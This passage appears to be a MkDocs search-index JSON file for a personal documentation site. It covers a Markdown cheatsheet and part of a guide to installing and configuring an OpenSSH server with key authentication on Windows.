text&lt;/small&gt;\n\n###### Heading 5 &lt;small&gt;with secondary text&lt;/small&gt;\n</code></pre> <p>Result:</p>", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-3-with-secondary-text", "title": "Heading 3 with secondary text", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-4-with-secondary-text", "title": "Heading 4 with secondary text", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-5-with-secondary-text", "title": "Heading 5 with secondary text", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-6-with-secondary-text", "title": "Heading 6 with secondary text", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"]}, {"location": "utilities/markdown-cheatsheet/code-blocks/", "title": "Markdown Code Blocks", "text": "<p>Code blocks and examples are an essential part of technical project documentation. Material for MkDocs provides different ways to set up syntax highlighting for code blocks, either during build time using [Pygments] or during runtime using a JavaScript syntax highlighter.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "code-blocks"]}, {"location": "utilities/markdown-cheatsheet/code-blocks/#adding-a-title", "title": "Adding a Title", "text": "<p>In order to provide additional context, a custom title can be added to a code block by using the <code>title=\"&lt;custom title&gt;\"</code> option directly after the shortcode, e.g. to display the name of a file:</p> <p>Example:</p> Code block with title<pre><code>```py title=\"bubble_sort.py\"\ndef bubble_sort(items):\n    for i in range(len(items)):\n        for j in range(len(items) - 1 - i):\n            if items[j] &gt; items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n```\n</code></pre> <p>Result:</p> bubble_sort.py<pre><code>def bubble_sort(items):\n    for i in range(len(items)):\n        for j in range(len(items) - 1 - i):\n            if items[j] &gt; items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "code-blocks"]}, {"location": "utilities/markdown-cheatsheet/code-blocks/#adding-line-numbers-to-code-block", "title": "Adding Line Numbers To Code Block", "text": "<p>Example:</p> <p>Line numbers can be added to a code block by using the <code>linenums=\"&lt;start&gt;\"</code> option directly after the shortcode, whereas <code>&lt;start&gt;</code> represents the starting line number. A code block can start from a line number other than <code>1</code>, which allows to split large code blocks for readability:</p> Code block with line numbers<pre><code>```py linenums=\"1\"\ndef bubble_sort(items):\n    for i in range(len(items)):\n        for j in range(len(items) - 1 - i):\n            if items[j] &gt; items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n```\n</code></pre> <p>Result:</p> <pre><code>def bubble_sort(items):\n    for i in range(len(items)):\n        for j in range(len(items) - 1 - i):\n            if items[j] &gt; items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "code-blocks"]}, {"location": "utilities/markdown-cheatsheet/code-blocks/#highlighting-specific-lines", "title": "Highlighting Specific Lines", "text": "<p>Specific lines can be highlighted by passing the line numbers to the <code>hl_lines</code> argument placed right after the language shortcode. Note that line counts start at <code>1</code>.</p> Code block with highlighted lines<pre><code>```py hl_lines=\"2 3\"\ndef bubble_sort(items):\n    for i in range(len(items)):\n        for j in range(len(items) - 1 - i):\n            if items[j] &gt; items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n```\n</code></pre> <p>Result:</p> <pre><code>def bubble_sort(items):\n    for i in range(len(items)):\n        for j in range(len(items) - 1 - i):\n            if items[j] &gt; items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "code-blocks"]}, {"location": "utilities/markdown-cheatsheet/code-blocks/#highlighting-inline-code-blocks", "title": "Highlighting Inline Code Blocks", "text": "<p>When <code>InlineHilite</code> is enabled, syntax highlighting can be applied to inline code blocks by prefixing them with a shebang, i.e. <code>#!</code>, directly followed by the corresponding <code>language shortcode</code></p> <p>Example:</p> Inline code block<pre><code>The `#!python range()` function is used to generate a sequence of numbers.\n</code></pre> <p>Result:</p> <p>The <code>range()</code> function is used to generate a sequence of numbers.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "code-blocks"]}, {"location": "utilities/markdown-cheatsheet/content-tabs/", "title": "Markdown Content Tabs", "text": "<p>Sometimes, it's desirable to group alternative content under different tabs, e.g. when describing how to access an API from different languages or environments. Material for MkDocs allows for beautiful and functional tabs, grouping code blocks and other content.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "content-tabs"]}, {"location": "utilities/markdown-cheatsheet/content-tabs/#usage", "title": "Usage", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "content-tabs"]}, {"location": "utilities/markdown-cheatsheet/content-tabs/#grouping-code-blocks", "title": "Grouping code blocks", "text": "<p>Code blocks are one of the primary targets to be grouped, and can be considered a special case of content tabs, as tabs with a single code block are always rendered without horizontal spacing:</p> <p>Example:</p> Content tabs with code blocks<pre><code>=== \"C\"\n\n    ``` c\n    #include &lt;stdio.h&gt;\n\n    int main(void) {\n      printf(\"Hello world!\\n\");\n      return 0;\n    }\n    ```\n\n=== \"C++\"\n\n    ``` c++\n    #include &lt;iostream&gt;\n\n    int main(void) {\n      std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n      return 0;\n    }\n    ```\n</code></pre> <p>Result:</p> CC++ <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n  printf(\"Hello world!\\n\");\n  return 0;\n}\n</code></pre> <pre><code>#include &lt;iostream&gt;\n\nint main(void) {\n  std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n  return 0;\n}\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "content-tabs"]}, {"location": "utilities/markdown-cheatsheet/content-tabs/#grouping-other-content", "title": "Grouping other content", "text": "<p>When a content tab contains more than one code block, it is rendered with horizontal spacing. Vertical spacing is never added, but can be achieved by nesting tabs in other blocks:</p> <p>Example:</p> Content tabs<pre><code>=== \"Unordered list\"\n\n    * Sed sagittis eleifend rutrum\n    * Donec vitae suscipit est\n    * Nulla tempor lobortis orci\n\n=== \"Ordered list\"\n\n    1. Sed sagittis eleifend rutrum\n    2. Donec vitae suscipit est\n    3. Nulla tempor lobortis orci\n</code></pre> <p>Result:</p> Unordered listOrdered list <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol>", "tags": ["markdown-cheatsheet", "mkdocs", "content-tabs"]}, {"location": "utilities/markdown-cheatsheet/content-tabs/#embedded-content", "title": "Embedded content", "text": "<p>When [SuperFences] is enabled, content tabs can contain arbitrary nested content, including further content tabs, and can be nested in other blocks like [admonitions] or blockquotes:</p> <p>Example:</p> Content tabs in admonition<pre><code>!!! example\n\n    === \"Unordered List\"\n\n        ``` markdown\n        * Sed sagittis eleifend rutrum\n        * Donec vitae suscipit est\n        * Nulla tempor lobortis orci\n        ```\n\n    === \"Ordered List\"\n\n        ``` markdown\n        1. Sed sagittis eleifend rutrum\n        2. Donec vitae suscipit est\n        3. Nulla tempor lobortis orci\n        ```\n</code></pre> <p>Result:</p> <p>Example</p> Unordered ListOrdered List <pre><code>* Sed sagittis eleifend rutrum\n* Donec vitae suscipit est\n* Nulla tempor lobortis orci\n</code></pre> <pre><code>1. Sed sagittis eleifend rutrum\n2. Donec vitae suscipit est\n3. Nulla tempor lobortis orci\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "content-tabs"]}, {"location": "utilities/markdown-cheatsheet/diagrams/", "title": "Mermaid Diagrams", "text": "<p>Diagrams help to communicate complex relationships and interconnections between different technical components, and are a great addition to project documentation. Material for MkDocs integrates with Mermaid.js, a very popular and flexible solution for drawing diagrams.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"]}, {"location": "utilities/markdown-cheatsheet/diagrams/#usage", "title": "Usage", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"]}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-flowcharts", "title": "Using Flowcharts", "text": "<p>Flowcharts are diagrams that represent workflows or processes. The steps are rendered as nodes of various kinds and are connected by edges, describing the necessary order of steps:</p> Flow chart<pre><code>```mermaid\ngraph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];\n```\n</code></pre> <p>Result:</p> <pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"]}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-sequence-diagrams", "title": "Using Sequence Diagrams", "text": "<p>Sequence diagrams describe a specific scenario as sequential interactions between multiple objects or actors, including the messages that are exchanged between those actors:</p> Sequence diagram<pre><code>```mermaid\nsequenceDiagram\n  Alice-&gt;&gt;John: Hello John, how are you?\n  loop Healthcheck\n      John-&gt;&gt;John: Fight against hypochondria\n  end\n  Note right of John: Rational thoughts!\n  John--&gt;&gt;Alice: Great!\n  John-&gt;&gt;Bob: How about you?\n  Bob--&gt;&gt;John: Jolly good!\n```\n</code></pre> <p>Result:</p> <pre><code>sequenceDiagram\n  Alice-&gt;&gt;John: Hello John, how are you?\n  loop Healthcheck\n      John-&gt;&gt;John: Fight against hypochondria\n  end\n  Note right of John: Rational thoughts!\n  John--&gt;&gt;Alice: Great!\n  John-&gt;&gt;Bob: How about you?\n  Bob--&gt;&gt;John: Jolly good!</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"]}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-state-diagrams", "title": "Using State Diagrams", "text": "<p>State diagrams are a great tool to describe the behavior of a system, decomposing it into a finite number of states, and transitions between those states:</p> State diagram<pre><code>```mermaid\nstateDiagram-v2\n  state fork_state &lt;&lt;fork&gt;&gt;\n    [*] --&gt; fork_state\n    fork_state --&gt; State2\n    fork_state --&gt; State3\n\n    state join_state &lt;&lt;join&gt;&gt;\n    State2 --&gt; join_state\n    State3 --&gt; join_state\n    join_state --&gt; State4\n    State4 --&gt; [*]\n```\n</code></pre> <p>Result:</p> <pre><code>stateDiagram-v2\n  state fork_state &lt;&lt;fork&gt;&gt;\n    [*] --&gt; fork_state\n    fork_state --&gt; State2\n    fork_state --&gt; State3\n\n    state join_state &lt;&lt;join&gt;&gt;\n    State2 --&gt; join_state\n    State3 --&gt; join_state\n    join_state --&gt; State4\n    State4 --&gt; [*]</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"]}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-class-diagrams", "title": "Using Class Diagrams", "text": "<p>Class diagrams are central to object oriented programing, describing the structure of a system by modelling entities as classes and relationships between them:</p> Class diagram<pre><code>```mermaid\nclassDiagram\n  Person &lt;|-- Student\n  Person &lt;|-- Professor\n  Person : +String name\n  Person : +String phoneNumber\n  Person : +String emailAddress\n  Person: +purchaseParkingPass()\n  Address \"1\" &lt;-- \"0..1\" Person:lives at\n  class Student{\n    +int studentNumber\n    +int averageMark\n    +isEligibleToEnrol()\n    +getSeminarsTaken()\n  }\n  class Professor{\n    +int salary\n  }\n  class Address{\n    +String street\n    +String city\n    +String state\n    +int postalCode\n    +String country\n    -validate()\n    +outputAsLabel()\n  }\n```\n</code></pre> <p>Result:</p> <pre><code>classDiagram\n  Person &lt;|-- Student\n  Person &lt;|-- Professor\n  Person : +String name\n  Person : +String phoneNumber\n  Person : +String emailAddress\n  Person: +purchaseParkingPass()\n  Address \"1\" &lt;-- \"0..1\" Person:lives at\n  class Student{\n    +int studentNumber\n    +int averageMark\n    +isEligibleToEnrol()\n    +getSeminarsTaken()\n  }\n  class Professor{\n    +int salary\n  }\n  class Address{\n    +String street\n    +String city\n    +String state\n    +int postalCode\n    +String country\n    -validate()\n    +outputAsLabel()\n  }</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"]}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-entity-relationship-diagrams", "title": "Using Entity-Relationship Diagrams", "text": "<p>An entity-relationship diagram is composed of entity types and specifies relationships that exist between entities. It describes inter-related things in a specific domain of knowledge:</p> Entity-relationship diagram<pre><code>```mermaid\nerDiagram\n  CUSTOMER ||--o{ ORDER : places\n  ORDER ||--|{ LINE-ITEM : contains\n  CUSTOMER }|..|{ DELIVERY-ADDRESS : uses\n```\n</code></pre> <p>Result:</p> <pre><code>erDiagram\n  CUSTOMER ||--o{ ORDER : places\n  ORDER ||--|{ LINE-ITEM : contains\n  CUSTOMER }|..|{ DELIVERY-ADDRESS : uses</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"]}, {"location": "utilities/markdown-cheatsheet/external-markdown/", "title": "Embed External Markdown", "text": "<p>MkDocs Embed External Markdown plugin that allows to inject section or full markdown content from a given url. The goal is to embed different markdown from different sources inside your MkDocs project.</p> <p>For more detailed inforation follow the link: Mkdocs Embed External Markdown Plugin</p>", "tags": ["markdown-cheatsheet", "mkdocs", "external-markdown"]}, {"location": "utilities/markdown-cheatsheet/external-markdown/#usage", "title": "Usage", "text": "<ul> <li>Section defined by \"##/###/####...\" header (h2/h3/h4...)</li> <li>\"#\" header (h1) will be removed from source content so you can use use your own header</li> <li>\"##/###/####...\" header (h2/h3/h4...) will be removed from source section content so you can use use your own header</li> <li>Supports multiple sections from any source</li> </ul> <p><code>external_markdown</code> requires 2 parameters: url and section name.</p> <pre><code>{{ external_markdown('url', '## section name') }}\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "external-markdown"]}, {"location": "utilities/markdown-cheatsheet/external-markdown/#full-markdown-content", "title": "Full Markdown Content", "text": "<p>Embed full markdown content from a given url, you can use the following example:</p> <pre><code>{{ external_markdown('https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/README.md', '') }}\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "external-markdown"]}, {"location": "utilities/markdown-cheatsheet/external-markdown/#specific-section", "title": "Specific Section", "text": "<p>Embed markdown section from a given url, you can use the following example:</p> <pre><code>{{ external_markdown('https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/README.md', '## Installation') }}\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "external-markdown"]}, {"location": "utilities/markdown-cheatsheet/icons/", "title": "Icons &amp; Emojis", "text": "<p>One of the best features of Material for MkDocs is the possibility to use more then with thousands of emojis in your project documentation with practically zero additional effort. Use Mkdocs Material Icon Search to find the icons and emojis you need.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "icons", "emojis"]}, {"location": "utilities/markdown-cheatsheet/icons/#usage", "title": "Usage", "text": "<p>Example:</p> <pre><code>:fontawesome-regular-bell: - Fontawesome Icon: Bell  \n:material-bell: - Material Icon: Bell  \n:octicons-bell-24: - Octicons Icon: Bell  \n:bell: - Emoji: Bell\n</code></pre> <p>Result:</p> <p> - Fontawesome Icon: Bell  - Material Icon: Bell  - Octicons Icon: Bell  - Emoji: Bell</p>", "tags": ["markdown-cheatsheet", "mkdocs", "icons", "emojis"]}, {"location": "utilities/markdown-cheatsheet/icons/#keyboard-keys-icons", "title": "Keyboard Keys Icons", "text": "<p>Example:</p> <pre><code>++ctrl+alt+del++\n</code></pre> <pre><code>++cmd+control+option++\n</code></pre> <p>Result:</p> <p>Ctrl+Alt+Del</p> <p>Cmd+Ctrl+Option</p>", "tags": ["markdown-cheatsheet", "mkdocs", "icons", "emojis"]}, {"location": "utilities/markdown-cheatsheet/images/", "title": "Markdown Images", "text": "<p>Markdown is a text format so naturally you can type in the Markdown representation of an image using examples below to put an image reference directly into the editor.</p> <p>Warning</p> <p>This site uses the Material Design for MkDocs theme with the following CSS overrides there for the results in your case may differ.</p> Custom css <pre><code>/* images css */\n.md-typeset img {\n  border-radius: 5px;\n  height: auto;\n  max-width: 95%;\n  margin: auto;\n  display: block;\n  box-shadow: rgba(149, 157, 165, 0.2) 0px 8px 24px;\n}\n</code></pre>", "tags": ["markdown-cheatsheet", "mkdocs", "images"]}, {"location": "utilities/markdown-cheatsheet/images/#embedding-images", "title": "Embedding Images", "text": "Internal soruce example<pre><code>![minion][internal-source]\n\n[internal-source]: ../../assets/images/markdown-cheatsheet/minion.png 'Title of the image'\n</code></pre> External source example<pre><code>![minion][external-source]\n\n[external-source]: https://octodex.github.com/images/minion.png 'Title of the image'\n</code></pre> <p>Result:</p> <p></p>", "tags": ["markdown-cheatsheet", "mkdocs", "images"]}, {"location": "utilities/markdown-cheatsheet/images/#embedding-images-with-width-attributes", "title": "Embedding Images With Width Attributes", "text": "width=200 example<pre><code>![minion][internal-source]{: style=\"width:200px\"}\n\n[internal-source]: ../../assets/images/markdown-cheatsheet/minion.png 'Title of the image'\n</code></pre> <p>Result:</p> <p></p>", "tags": ["markdown-cheatsheet", "mkdocs", "images"]}, {"location": "utilities/markdown-cheatsheet/links/", "title": "Markdown Links", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "links"]}, {"location": "utilities/markdown-cheatsheet/links/#link-with-title", "title": "Link With Title", "text": "Link with Title Example<pre><code>[My Github Page][github-url]\n\n[github-url]: https://github.com/fire1ce 'Title of the link'\n</code></pre> <p>Result:</p> <p>My Github Page</p>", "tags": ["markdown-cheatsheet", "mkdocs", "links"]}, {"location": "utilities/markdown-cheatsheet/links/#open-in-new-tab", "title": "Open In New Tab", "text": "<p>Append <code>(target=\\_blank)</code> to the end of the link.</p> Open In New Tab Link Example<pre><code>[My Github Page][github-url]{target=\\_blank}\n\n[github-url]: https://github.com/fire1ce 'Title of the link'\n</code></pre> <p>Result:</p> <p>My Github Page</p> <p>Result:</p>", "tags": ["markdown-cheatsheet", "mkdocs", "links"]}, {"location": "utilities/markdown-cheatsheet/links/#internal-anchor-links", "title": "Internal Anchor Links", "text": "Internal Anchor Links Example<pre><code>[Jumps to section in page][internal-anchor-link]\n\n[internal-anchor-link]: tables-lists-quotes.md#lists 'Internal Anchor Links'\n</code></pre> <p>Result:</p> <p>Jumps to section in page</p>", "tags": ["markdown-cheatsheet", "mkdocs", "links"]}, {"location": "utilities/markdown-cheatsheet/links/#image-with-links", "title": "Image With Links", "text": "Image With Links Example<pre><code>[![This is Image with link][image-link]][url-link]{target=\\_blank}\n\n[image-link]: ../../assets/images/markdown-cheatsheet/minion200x200.png 'Minion'\n[url-link]: https://github.com/fire1ce 'Go to Github'\n</code></pre> <p>Result:</p> <p></p>", "tags": ["markdown-cheatsheet", "mkdocs", "links"]}, {"location": "utilities/markdown-cheatsheet/links/#mailto-link", "title": "<code>Mailto</code> Link", "text": "Mailto Link Example<pre><code>[Send Email][mail-to-link]\n\n[mail-to-link]: mailto:example@example.com 'Send Email'\n</code></pre> <p>Result:</p> <p>Send Email</p>", "tags": ["markdown-cheatsheet", "mkdocs", "links"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/", "title": "Tables, Lists and Quotes", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#tables", "title": "Tables", "text": "<p>A table in Markdown consists of two parts: the header and the rows of data in the table. As per the Markdown spec:</p> <ul> <li>pipe (|) character separates the individual columns in a table.</li> <li>(-) hyphens act as a delimiter row to separate the header row from the body.</li> <li>(:) colon to align cell contents.</li> </ul> Table Example<pre><code>| **Option** | **Description**                            |\n| ---------- | ------------------------------------------ |\n| data       | path to data files to supply the data.     |\n| engine     | engine to be used for processing templates |\n| ext        | extension to be used for dest files.       |\n</code></pre> <p>Result:</p> Option Description data path to data files to supply the data. engine engine to be used for processing templates ext extension to be used for dest files.", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#column-alignment", "title": "Column Alignment", "text": "<p>If you want to align a specific column to the <code>left</code>, <code>center</code> or <code>right</code>, you can use the [regular Markdown syntax] placing <code>:</code> characters at the beginning and/or end of the divider.</p> LeftCenterRight Data table, columns aligned to left<pre><code>| Method      | Description                          |\n| :---------- | :----------------------------------- |\n| `GET`       | :material-check:     Fetch resource  |\n| `PUT`       | :material-check-all: Update resource |\n| `DELETE`    | :material-close:     Delete resource |\n</code></pre> Method Description <code>GET</code>      Fetch resource <code>PUT</code>  Update resource <code>DELETE</code>      Delete resource Data table, columns centered<pre><code>| Method      | Description                          |\n| :---------: | :----------------------------------: |\n| `GET`       | :material-check:     Fetch resource  |\n| `PUT`       | :material-check-all: Update resource |\n| `DELETE`    | :material-close:     Delete resource |\n</code></pre> Method Description <code>GET</code>      Fetch resource <code>PUT</code>  Update resource <code>DELETE</code>      Delete resource Data table, columns aligned to right<pre><code>| Method      | Description                          |\n| ----------: | -----------------------------------: |\n| `GET`       | :material-check:     Fetch resource  |\n| `PUT`       | :material-check-all: Update resource |\n| `DELETE`    | :material-close:     Delete resource |\n</code></pre> Method Description <code>GET</code>      Fetch resource <code>PUT</code>  Update resource <code>DELETE</code>      Delete resource", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#lists", "title": "Lists", "text": "", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#unordered-list", "title": "Unordered List", "text": "<p>Bullet point lists can be created by starting each line with an asterisk followed by a space before the content of the bullet point. Note that the space is important and should not be forgotten.</p> <p>Example:</p> Unordered List Example<pre><code>- Lorem ipsum dolor sit amet\n- Consectetur adipiscing elit\n- Integer molestie lorem at massa\n- Facilisis in pretium nisl aliquet\n</code></pre> <p>Result:</p> <ul> <li>Lorem ipsum dolor sit amet</li> <li>Consectetur adipiscing elit</li> <li>Integer molestie lorem at massa</li> <li>Facilisis in pretium nisl aliquet</li> </ul>", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#ordered-list", "title": "Ordered List", "text": "<p>Similarly, numbered lists can be created by starting each line with a number followed by a space and then the relevant text.</p> Ordered List Example<pre><code>1. Lorem ipsum dolor sit amet\n2. Consectetur adipiscing elit\n3. Integer molestie lorem at massa\n4. Faucibus porta lacus fringilla vel\n5. Aenean sit amet erat nunc\n6. Eget porttitor lorem\n</code></pre> <p>Result:</p> <ol> <li>Lorem ipsum dolor sit amet</li> <li>Consectetur adipiscing elit</li> <li>Integer molestie lorem at massa</li> <li>Faucibus porta lacus fringilla vel</li> <li>Aenean sit amet erat nunc</li> <li>Eget porttitor lorem</li> </ol>", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#blocks-list", "title": "Blocks List", "text": "Blocks List Example<pre><code>&gt; - list under lists\n&gt; - under lists\n</code></pre> <p>Result:</p> <ul> <li>list under lists</li> <li>under lists</li> </ul>", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#tasklists", "title": "Tasklists", "text": "<p>A task list is a set of tasks that each render on a separate line with a clickable checkbox. You can select or deselect the checkboxes to mark the tasks as complete or incomplete.</p> <p>You can use Markdown to create a task list in any comment on GitHub. If you reference an issue, pull request, or discussion in a task list, the reference will unfurl to show the title and state.</p> <p>Example:</p> Task List Example<pre><code>- [x] Lorem ipsum dolor sit amet, consectetur adipiscing elit\n- [ ] Vestibulum convallis sit amet nisi a tincidunt\n  - [x] In hac habitasse platea dictumst\n  - [x] In scelerisque nibh non dolor mollis congue sed et metus\n  - [ ] Praesent sed risus massa\n- [ ] Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque\n</code></pre> <p>Result:</p> <ul> <li> Lorem ipsum dolor sit amet, consectetur adipiscing elit</li> <li> Vestibulum convallis sit amet nisi a tincidunt</li> <li> In hac habitasse platea dictumst</li> <li> In scelerisque nibh non dolor mollis congue sed et metus</li> <li> Praesent sed risus massa</li> <li> Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque</li> </ul>", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#block-quotes", "title": "Block Quotes", "text": "<p>For quoting blocks of content from another source within your document.</p> <p>Add <code>&gt;</code> before any text you want to quote.</p> Quoting Blocks Example<pre><code>&gt; Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.\n&gt; Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.\n</code></pre> <p>Result:</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#nested-block-quotes", "title": "Nested Block Quotes", "text": "Quoting Blocks Nested Example<pre><code>&gt; Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.\n&gt; Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.\n&gt;\n&gt; &gt; Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctorodio\n&gt; &gt; non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.\n</code></pre> <p>Result:</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.</p> <p>Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctorodio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.</p>", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"]}, {"location": "windows/ssh-server/", "title": "Windows SSH Server", "text": "<p>Sometime you need to connect to a remote server via <code>SSH</code>. Usually it's the main connection to linux servers. But you can also connect to a windows server via <code>SSH</code>. At this guide we will show you how to install and configure a windows ssh server, including <code>SSH Keys authentication</code>.</p>", "tags": ["windows", "ssh-server", "powershell", "rsa-keys"]}, {"location": "windows/ssh-server/#ssh-server-installation-on-windows", "title": "SSH Server Installation on Windows", "text": "<p>We will be using PowerShell to install the SSH server inculding the SSH client.</p> <p>Open PowerShell Terminal as Administrator.</p> <p>Run the following commands to install the SSH server and client.</p> <pre><code>Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0\nAdd-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\n</code></pre> <p>After the installaton you can check the Windows SSH server and client are installed.</p> <pre><code>Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'\n</code></pre> <p>The output will be something like this:</p> <p></p> <p>To start the Windows SSH server service</p> <pre><code>Start-Service sshd\n</code></pre> <p>Enable Windows SSH Server on Windows Boot</p> <pre><code>Set-Service -Name sshd -StartupType 'Automatic'\n</code></pre> <p>Add a Firewall rule to allow the SSH port</p> <pre><code>if (!(Get-NetFirewallRule -Name \"OpenSSH-Server-In-TCP\" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) { Write-Output \"Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it...\" New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 } else { Write-Output \"Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists.\" }\n</code></pre> <p>At this point you should be able to connect via SSH to the Windows server with your username and password.</p> <p></p>", "tags": ["windows", "ssh-server", "powershell", "rsa-keys"]}, {"location": "windows/ssh-server/#adding-ssh-keys", "title": "Adding SSH Keys", "text": "", "tags": ["windows", "ssh-server", "powershell", "rsa-keys"]}, {"location": "windows/ssh-server/#administrator-user", "title": "Administrator User", "text": "<p>Create the file: <code>administrators_authorized_keys</code> at the following location:</p> <pre><code>C:\\ProgramData\\ssh\\administrators_authorized_keys\n</code></pre> <p>Edit the file and add you SSH public key to the file.</p> <p>Now we need to import the SSH public key to the Windows SSH server. We can do this by using the following command:</p> <pre><code>icacls.exe \"C:\\ProgramData\\ssh\\administrators_authorized_keys\" /inheritance:r /grant \"Administrators:F\" /grant \"SYSTEM:F\"\n</code></pre> <p>Test the SSH connection to the Windows server from remote machine with the SSH Key. You should be able to connect to the Windows server with your SSH key</p>", "tags": ["windows", "ssh-server", "powershell", "rsa-keys"]}, {"location": "windows/ssh-server/#regular-user-non-administrator", "title": "Regular User (non-administrator)", "text": "<p>Create a <code>.ssh</code> directory in the home directory of the user.</p> <pre><code>```path\nC:\\Users\\&lt;username&gt;\\.ssh\\\n</code></pre> <p>Create the file: <code>authorized_keys</code> at the following location:</p> <pre><code>C:\\Users\\&lt;username&gt;\\.ssh\\authorized_keys\n</code></pre> <p>Edit the file and add you SSH public key to the file.</p> <p>Test the SSH connection to the Windows server from remote machine with the SSH Key. You should be able to connect with non-administrator user to the Windows server with your SSH key</p>", "tags": ["windows", 